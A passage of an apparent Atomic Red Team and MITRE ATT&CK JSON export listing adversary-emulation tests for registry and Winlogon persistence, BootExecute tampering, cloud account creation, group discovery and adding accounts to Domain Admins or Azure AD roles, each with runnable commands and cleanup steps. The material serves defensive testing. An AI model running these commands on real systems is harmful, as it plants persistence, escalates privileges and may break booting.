\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nRemove-Item \"#{new_startup_folder}\" -Recurse -Force\n", "name": "powershell"}}, {"name": "HKCU - Policy Settings Explorer Run Key", "auto_generated_guid": "a70faea1-e206-4f6f-8d9a-67379be8f6f1", "description": "This test will create a new value under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run to launch calc.exe on boot. \n*Requires reboot\n", "supported_platforms": ["windows"], "input_arguments": {"target_key_value_name": {"description": "registry value to crate on target key", "type": "string", "default": "atomictest"}, "payload": {"description": "payload to execute", "type": "string", "default": "C:\\Windows\\System32\\calc.exe"}}, "executor": {"command": "if (!(Test-Path -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){\n  New-Item -ItemType Key -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\n}\nSet-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\"\n", "cleanup_command": "Remove-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\"", "name": "powershell", "elevation_required": true}}, {"name": "HKLM - Policy Settings Explorer Run Key", "auto_generated_guid": "b5c9a9bc-dda3-4ea0-b16a-add8e81ab75f", "description": "This test will create a HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run key value to launch calc.exe on boot. \n*Requires reboot\n", "supported_platforms": ["windows"], "input_arguments": {"target_key_value_name": {"description": "registry value to crate on target key", "type": "string", "default": "atomictest"}, "payload": {"description": "payload to execute", "type": "string", "default": "C:\\Windows\\System32\\calc.exe"}}, "executor": {"command": "if (!(Test-Path -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){\n  New-Item -ItemType Key -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\n}\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\"\n", "cleanup_command": "Remove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\"", "name": "powershell", "elevation_required": true}}, {"name": "HKLM - Append Command to Winlogon Userinit KEY Value", "auto_generated_guid": "f7fab6cc-8ece-4ca7-a0f1-30a22fccd374", "description": "This test will append a command to the  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit value to launch calc.exe on boot.\n* Requires reboot\n", "supported_platforms": ["windows"], "input_arguments": {"payload": {"description": "what to run", "type": "string", "default": "C:\\Windows\\System32\\calc.exe"}}, "executor": {"command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\");\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit-backup\" -Value \"$oldvalue\";\n$newvalue = $oldvalue + \" #{payload}\";\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$newvalue\"\n", "cleanup_command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Userinit-backup');\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$oldvalue\";\nRemove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Userinit-backup'", "name": "powershell", "elevation_required": true}}, {"name": "HKLM - Modify default System Shell - Winlogon Shell KEY Value ", "auto_generated_guid": "1d958c61-09c6-4d9e-b26b-4130314e520e", "description": "This test change the default value of HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell from \"explorer.exe\" to the full path of \"C:\\Windows\\explorer.exe\" \nto log a change to the key's default value without breaking boot sequence. \nAn atacker will alternatively replace this with a custom shell. \n", "supported_platforms": ["windows"], "input_arguments": {"payload": {"description": "what to run", "type": "string", "default": "C:\\Windows\\explorer.exe"}}, "executor": {"command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\");\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell-backup\" -Value \"$oldvalue\";\n$newvalue = $oldvalue + \", #{payload}\";\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"$newvalue\"\n", "cleanup_command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Shell-backup');\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"$oldvalue\";\nRemove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Shell-backup'", "name": "powershell", "elevation_required": true}}, {"name": "secedit used to create a Run key in the HKLM Hive", "auto_generated_guid": "14fdc3f1-6fc3-4556-8d36-aa89d9d42d02", "description": "secedit allows to manipulate the HKLM hive of the Windows registry. This test creates a Run key with the keyname calc having calc.exe as the value in the HKLM hive.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n", "supported_platforms": ["windows"], "input_arguments": {"ini_file": {"description": "INI config template", "type": "string", "default": "$PathToAtomicsFolder\\T1547.001\\src\\regtemplate.ini"}, "secedit_db": {"description": "Custom secedit db", "type": "string", "default": "mytemplate.db"}}, "executor": {"command": "secedit /import /db #{secedit_db} /cfg \"#{ini_file}\"\nsecedit /configure /db #{secedit_db}\n", "cleanup_command": "REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"calc\" /f >nul 2>&1", "name": "command_prompt", "elevation_required": true}}, {"name": "Modify BootExecute Value", "auto_generated_guid": "befc2b40-d487-4a5a-8813-c11085fb5672", "description": "This test modifies the BootExecute registry value to \"autocheck autoche *\", which can be used to simulate an adversary's attempt to tamper with the system's boot process. \nReference - https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf\nNOTE that by not saving the correct value, you may inhibit your system from booting properly. Only run on a test system. There is a reg export before running the Atomic.\n", "supported_platforms": ["windows"], "input_arguments": {"registry_value": {"description": "Registry value to set", "type": "string", "default": "autocheck autoche *"}}, "executor": {"command": "if (!(Test-Path \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\")) { reg.exe export \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\" /y }\nSet-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" -Name \"BootExecute\" -Value \"#{registry_value}\" -Type MultiString\n", "cleanup_command": "reg.exe import \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\"\nRemove-Item -Path \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\" -Force\n", "name": "powershell", "elevation_required": true}}]}, "T1136.003": {"name": "Cloud Account", "technique_id": "attack-pattern--a009cb25-4801-4116-9105-80a91cf15c1b", "external_id": "T1136.003", "data_components": ["User Account Creation"], "kill_chain_phases": ["persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0"], "description": "Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users)\n\nAdversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.\n\nOnce an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) or assigning [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).", "atomic_tests": [{"name": "AWS - Create a new IAM user", "auto_generated_guid": "8d1c2368-b503-40c9-9057-8e42f21c58ad", "description": "Creates a new IAM user in AWS. Upon successful creation, a new user will be created. Adversaries create new IAM users so that their malicious activity do not interupt the normal functions of the compromised users and can remain undetected for a long time\n", "supported_platforms": ["iaas:aws"], "input_arguments": {"username": {"description": "Username of the IAM user to create in AWS", "type": "string", "default": "atomicredteam"}}, "dependencies": [{"description": "Check if ~/.aws/credentials file has a default stanza is configured\n", "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n", "get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"}], "executor": {"command": "aws iam create-user --user-name #{username}\n", "cleanup_command": "aws iam delete-user --user-name #{username}\n", "name": "sh", "elevation_required": false}}, {"name": "Azure AD - Create a new user", "auto_generated_guid": "e62d23ef-3153-4837-8625-fa4a3829134d", "description": "Creates a new user in Azure AD. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.", "supported_platforms": ["azure-ad"], "input_arguments": {"username": {"description": "Display name of the new user to be created in Azure AD", "type": "string", "default": "atomicredteam"}, "userprincipalname": {"description": "User principal name (UPN) for the new Azure user being created format email address", "type": "string", "default": "atomicredteam@yourdomain.com"}, "password": {"description": "Password for the new Azure AD user being created", "type": "string", "default": "reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Check if AzureAD PowerShell module is installed", "prereq_command": "Get-InstalledModule -Name AzureAD", "get_prereq_command": "echo \"use the following to install AzureAD PowerShell module - Install-Module -Name AzureAD -Scope CurrentUser -Repository PSGallery -Force\""}, {"description": "Check if AzureAD PowerShell module is installed", "prereq_command": "Update the input arguments so the userprincipalname value is accurate for your environment", "get_prereq_command": "echo \"Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment\""}], "executor": {"command": "Connect-AzureAD\n$userprincipalname = \"#{userprincipalname}\"\n$username = \"#{username}\"      \n$password = \"#{password}\"\n$PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile\n$PasswordProfile.Password = $password\nNew-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username      ", "cleanup_command": "Remove-AzureADUser -ObjectId \"#{userprincipalname}\"", "name": "powershell"}}, {"name": "Azure AD - Create a new user via Azure CLI", "auto_generated_guid": "228c7498-be31-48e9-83b7-9cb906504ec8", "description": "Creates a new user in Azure AD via the Azure CLI. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.", "supported_platforms": ["azure-ad"], "input_arguments": {"username": {"description": "Display name of the new user to be created in Azure AD", "type": "string", "default": "atomicredteam"}, "userprincipalname": {"description": "User principal name (UPN) for the new Azure user being created format email address", "type": "string", "default": "atomicredteam@yourdomain.com"}, "password": {"description": "Password for the new Azure AD user being created", "type": "string", "default": "reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Check if Azure CLI is installed and install manually", "prereq_command": "az account list", "get_prereq_command": "echo \"use the following to install the Azure CLI manually https://aka.ms/installazurecliwindows\""}, {"description": "Check if Azure CLI is installed and install via PowerShell", "prereq_command": "az account list", "get_prereq_command": "echo \"use the following to install the Azure CLI $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; Remove-Item .\\AzureCLI.msi\""}, {"description": "Update the userprincipalname to meet your requirements", "prereq_command": "Update the input arguments so the userprincipalname value is accurate for your environment", "get_prereq_command": "echo \"Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment\""}], "executor": {"command": "az login\n$userprincipalname = \"#{userprincipalname}\"\n$username = \"#{username}\"      \n$password = \"#{password}\"\naz ad user create --display-name $username --password $password --user-principal-name $userprincipalname\naz ad user list --filter \"displayname eq 'atomicredteam'\"     ", "cleanup_command": "az ad user delete --id", "name": "powershell"}}]}, "T1069.001": {"name": "Local Groups", "technique_id": "attack-pattern--a01bf75f-00b2-4568-a58f-565ff9bf202b", "external_id": "T1069.001", "data_components": ["Group Enumeration", "Process Creation", "Command Execution", "OS API Execution"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.", "atomic_tests": [{"name": "Permission Groups Discovery (Local)", "auto_generated_guid": "952931a4-af0b-4335-bbbe-73c8c5b327ae", "description": "Permission Groups Discovery\n", "supported_platforms": ["linux", "macos"], "executor": {"command": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v id)\" ]; then id; else echo \"id is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v getent)\" ]; then getent group; else echo \"getent is missing from the machine. skipping...\"; fi;\ncat /etc/group\n", "name": "sh"}}, {"name": "Basic Permission Groups Discovery Windows (Local)", "auto_generated_guid": "1f454dd6-e134-44df-bebb-67de70fb6cd8", "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "net localgroup\nnet localgroup \"Administrators\"\n", "name": "command_prompt"}}, {"name": "Permission Groups Discovery PowerShell (Local)", "auto_generated_guid": "a580462d-2c19-4bc7-8b9a-57a41b7d3ba4", "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "get-localgroup\nGet-LocalGroupMember -Name \"Administrators\"\n", "name": "powershell"}}, {"name": "SharpHound3 - LocalAdmin", "auto_generated_guid": "e03ada14-0980-4107-aff1-7783b2b59bb1", "description": "This module runs the Windows executable of SharpHound in order to remotely list members of the local Administrators group (SAMR)\n", "supported_platforms": ["windows"], "input_arguments": {"domain": {"description": "FQDN of the targeted domain", "type": "string", "default": "$env:UserDnsDomain"}, "sharphound_path": {"description": "SharpHound Windows executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.exe"}, "output_path": {"description": "Output for SharpHound", "type": "path", "default": "$env:TEMP\\SharpHound\\"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "SharpHound binary must exist on disk and at specified location (#{sharphound_path}).\nAnd the computer must be domain joined (implicit authentication).\n", "prereq_command": "if (Test-Path \"#{sharphound_path}\") { exit 0 } else { exit 1 }\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/BloodHoundAD/BloodHound/blob/e062fe73d73c015dccb37fae5089342d009b84b8/Collectors/SharpHound.exe?raw=true\" -OutFile \"#{sharphound_path}\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "New-Item -Path \"#{output_path}\" -ItemType Directory > $null\n& \"#{sharphound_path}\" -d \"#{domain}\" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory \"#{output_path}\"\n", "cleanup_command": "Remove-Item -Recurse #{output_path} -ErrorAction Ignore\n"}}, {"name": "Wmic Group Discovery", "auto_generated_guid": "7413be50-be8e-430f-ad4d-07bf197884b2", "description": "Utilizing wmic.exe to enumerate groups on the local system. Upon execution, information will be displayed of local groups on system.\n", "supported_platforms": ["windows"], "executor": {"command": "wmic group get name\n", "name": "command_prompt"}}, {"name": "WMIObject Group Discovery", "auto_generated_guid": "69119e58-96db-4110-ad27-954e48f3bb13", "description": "Utilizing PowerShell cmdlet - get-wmiobject, to enumerate local groups on the endpoint. Upon execution, Upon execution, information will be displayed of local groups on system.\n", "supported_platforms": ["windows"], "executor": {"command": "Get-WMIObject Win32_Group\n", "name": "powershell"}}, {"name": "Permission Groups Discovery for Containers- Local Groups", "auto_generated_guid": "007d7aa4-8c4d-4f55-ba6a-7c965d51219c", "description": "Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.", "supported_platforms": ["containers"], "dependency_executor_name": "sh", "dependencies": [{"description": "Verify docker is installed.", "prereq_command": "which docker\n", "get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"}, {"description": "Verify docker service is running.", "prereq_command": "sudo systemctl status docker  --no-pager\n", "get_prereq_command": "sudo systemctl start docker\n"}], "executor": {"command": "docker build -t t1069 $PathtoAtomicsFolder/T1069.001/src/\ndocker run --name t1069_container  -d -t t1069\ndocker exec t1069_container ./test.sh", "cleanup_command": "docker stop t1069_container\ndocker rmi -f t1069", "name": "sh"}}]}, "T1098": {"name": "Account Manipulation", "technique_id": "attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27", "external_id": "T1098", "data_components": ["Active Directory Object Modification", "File Modification", "Group Modification", "User Account Modification", "Command Execution", "Process Creation"], "kill_chain_phases": ["persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0"], "description": "Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).", "atomic_tests": [{"name": "Admin Account Manipulate", "auto_generated_guid": "5598f7cb-cf43-455e-883a-f6008c5d46af", "description": "Manipulate Admin Account Name\n", "supported_platforms": ["windows"], "executor": {"command": "$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHa_$x$y$z\n\n$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match \"User\" -and $_.PrincipalSource -match \"Local\"} | Select Name\n\nforeach($member in $fmm) {\n    if($member -like \"*Administrator*\") {\n        $account = $member.Name.Split(\"\\\")[-1] # strip computername\\\n        $originalDescription = (Get-LocalUser -Name $account).Description\n        Set-LocalUser -Name $account -Description \"atr:$account;$originalDescription\".Substring(0,48) # Keep original name in description\n        Rename-LocalUser -Name $account -NewName \"HaHa_$x$y$z\" # Required due to length limitation\n        Write-Host \"Successfully Renamed $account Account on \" $Env:COMPUTERNAME\n        }\n    }\n", "cleanup_command": "$list = Get-LocalUser |?{$_.Description -like \"atr:*\"}\nforeach($u in $list) {\n  $u.Description -match \"atr:(?<Name>[^;]+);(?<Description>.*)\"\n  Set-LocalUser -Name $u.Name -Description $Matches.Description\n  Rename-LocalUser -Name $u.Name -NewName $Matches.Name\n  Write-Host \"Successfully Reverted Account $($u.Name) to $($Matches.Name) on \" $Env:COMPUTERNAME\n}\n", "name": "powershell", "elevation_required": true}}, {"name": "Domain Account and Group Manipulate", "auto_generated_guid": "a55a22e9-a3d3-42ce-bd48-2653adb8f7a9", "description": "Create a random atr-nnnnnnnn account and add it to a domain group (by default, Domain Admins). \n\nThe quickest way to run it is against a domain controller, using `-Session` of `Invoke-AtomicTest`. Alternatively,\nyou need to install PS Module ActiveDirectory (in prereqs) and run the script with appropriare AD privileges to \ncreate the user and alter the group. Automatic installation of the dependency requires an elevated session, \nand is unlikely to work with Powershell Core (untested).\n\nIf you consider running this test against a production Active Directory, the good practise is to create a dedicated\nservice account whose delegation is given onto a dedicated OU for user creation and deletion, as well as delegated\nas group manager of the target group.\n\nExample: `Invoke-AtomicTest -Session $session 'T1098' -TestNames \"Domain Account and Group Manipulate\" -InputArgs @{\"group\" = \"DNSAdmins\" }`\n", "supported_platforms": ["windows"], "input_arguments": {"account_prefix": {"description": "Prefix string of the random username (by default, atr-). Because the cleanup deletes such account based on\na match `(&(samaccountname=#{account_prefix}-*)(givenName=Test))`, if you are to change it, be careful.\n", "type": "string", "default": "atr-"}, "group": {"description": "Name of the group to alter", "type": "string", "default": "Domain Admins"}, "create_args": {"description": "Additional string appended to New-ADUser call", "type": "string", "default": ""}}, "dependencies": [{"description": "PS Module ActiveDirectory\n", "prereq_command": "Try {\n    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null\n    exit 0\n} \nCatch {\n    exit 1\n}\n", "get_prereq_command": "if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {\n  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online\n} else {\n  Install-WindowsFeature RSAT-AD-PowerShell\n}\n"}], "executor": {"command": "$x = Get-Random -Minimum 2 -Maximum 99\n$y = Get-Random -Minimum 2 -Maximum 99\n$z = Get-Random -Minimum 2 -Maximum 99\n$w = Get-Random -Minimum 2 -Maximum 99\n\nImport-Module ActiveDirectory\n$account = \"#{account_prefix}-$x$y$z\"\nNew-ADUser -Name $account -GivenName \"Test\" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}\nAdd-ADGroupMember \"#{group}\" $account\n", "cleanup_command": "Get-ADUser -LDAPFilter \"(&(samaccountname=#{account_prefix}-*)(givenName=Test))\" | Remove-ADUser -Confirm:$False\n", "name": "powershell"}}, {"name": "AWS - Create a group and add a user to that group", "auto_generated_guid": "8822c3b0-d9f9-4daf-a043-49f110a31122", "description": "Adversaries create AWS group, add users to specific to that group to elevate their privilieges to gain more accesss\n", "supported_platforms": ["iaas:aws"], "input_arguments": {"username": {"description": "Name of the AWS group to create", "type": "string", "default": "atomicredteam"}}, "dependencies": [{"description": "Check if the user exists, we can only add a user to a group if the user exists.\n", "prereq_command": "aws iam list-users | grep #{username}\n", "get_prereq_command": "echo Please run atomic test T1136.003, before running this atomic test\n"}], "executor": {"command": "aws iam create-group --group-name #{username}\naws iam add-user-to-group --user-name #{username} --group-name #{username}\n", "cleanup_command": "aws iam remove-user-from-group --user-name #{username} --group-name #{username}\naws iam delete-group --group-name #{username}\n", "name": "sh"}}, {"name": "Azure AD - adding user to Azure AD role", "auto_generated_guid": "0e65ae27-5385-46b4-98ac-607a8ee82261", "description": "The adversaries want to add user to some Azure AD role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, \nPrivileged Authentication Administrator (this role can reset Global Administrator password!).\nBy default, the role Global Reader is assigned to the user principal in this test.\n\nThe account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer you will also see User as a type.\n", "supported_platforms": ["azure-ad"], "input_arguments": {"username": {"description": "Azure AD username", "type": "string", "default": "jonh@contoso.com"}, "password": {"description": "Azure AD password", "type": "string", "default": "p4sswd"}, "user_principal_name": {"description": "Display Name, or User Principal Name, of the targeted user principal", "type": "string", "default": "SuperUser"}, "role_name": {"description": "Name of the targeted Azure AD role", "type": "string", "default": "Global Reader"}}, "dependencies": [{"description": "AzureAD module must be installed.\n", "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n", "get_prereq_command": "Install-Module -Name AzureAD -Force\n"}], "executor": {"command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$user = Get-AzureADUser -Filter \"DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'\"\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq '#{role_name}'\"\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\nAdd-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId\nWrite-Host \"User $($user.DisplayName) was added to $($role.DisplayName) role\"\n", "cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore\n\n$user = Get-AzureADUser -Filter \"DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'\"\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq '#{role_name}'\"\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nRemove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $user.ObjectId\nWrite-Host \"User $($user.DisplayName) was removed from $($role.DisplayName) role\"\n", "name": "powershell", "elevation_required": false}}, {"name": "Azure AD - adding service principal to Azure AD role", "auto_generated_guid": "92c40b3f-c406-4d1f-8d2b-c039bf5009e4", "description": "The adversaries want to add service principal to some Azure AD role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, \nPrivileged Authentication Administrator (this role can reset Global Administrator password!).\nBy default, the role Global Reader is assigned to service principal in this test.\n\nThe account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer you will also see Service Principal as a type.\n", "supported_platforms": ["azure-ad"], "input_arguments": {"username": {"description": "Azure AD username", "type": "string", "default": "jonh@contoso.com"}, "password": {"description": "Azure AD password", "type": "string", "default": "p4sswd"}, "service_principal_name": {"description": "Name of the service principal", "type": "string", "default": "SuperSP"}, "role_name": {"description": "Name of the targeted Azure AD role", "type": "string", "default": "Global Reader"}}, "dependencies": [{"description": "AzureAD module must be installed.\n", "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n", "get_prereq_command": "Install-Module -Name AzureAD -Force\n"}], "executor": {"command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$sp = Get-AzureADServicePrincipal -Filter \"DisplayName eq '#{service_principal_name}'\"\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq '#{role_name}'\"\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\nAdd-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId\nWrite-Host \"Service Principal $($sp.DisplayName) was added to $($role.DisplayName)\"\n", "cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore\n\n$sp = Get-AzureADServicePrincipal -Filter \"DisplayName eq '#{service_principal_name}'\"\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq '#{role_name}'\"\nif ($role -eq $null) { Write-Warning \"Role not 